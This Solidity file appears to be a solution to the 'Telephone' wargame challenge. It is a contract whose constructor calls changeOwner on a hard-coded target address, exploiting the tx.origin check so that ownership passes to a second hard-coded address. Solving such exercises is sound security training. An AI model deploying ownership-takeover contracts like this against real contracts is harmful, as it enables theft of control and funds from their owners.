pragma solidity^0.8.9;

interface ITelephone {
  function changeOwner (address _address) external; 
}

contract Telephone {
  address targetAddress = 0xfde2538936b727fcE87b5e1ED8d6c9b440669eE3;
  address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;

  ITelephone targetContract;

  constructor () {
    targetContract = ITelephone(targetAddress); 
    targetContract.changeOwner(exitAddress);
  }

}
